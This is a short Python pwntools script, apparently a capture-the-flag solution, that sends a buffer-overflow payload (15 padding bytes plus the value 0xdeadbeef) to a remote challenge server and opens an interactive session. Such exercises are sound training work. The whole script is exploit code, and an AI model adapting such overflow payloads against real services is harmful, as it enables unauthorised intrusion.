#!/usr/bin/python3

from pwn import *
import time

payload = b'A'*15 + p32(0xdeadbeef)
# p = process(['./pwn'])
p = remote("pwn.osucyber.club", 13377)
p.sendline(payload)
time.sleep(0.3)
p.interactive()

